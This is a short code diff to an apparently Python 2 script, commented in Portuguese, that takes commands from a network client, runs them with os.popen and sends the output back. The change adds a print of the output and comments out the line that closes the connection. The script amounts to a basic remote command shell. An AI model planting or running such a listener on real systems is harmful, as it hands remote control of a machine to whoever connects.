@@ -21,9 +21,11 @@ def main():
         #executa comando(S)
         print "Vou executar o comando: "+comando
         output = "\nComando "+comando+" saida:\n" + os.popen(comando).read() + "\n"
+        print output
         #cenvia saida do(S) comando(S)
         conexaoCliente.send(output)
-    conexaoCliente.close()
+
+    #conexaoCliente.close()
 
 def decodifica(cmd):
     if cmd == "1":
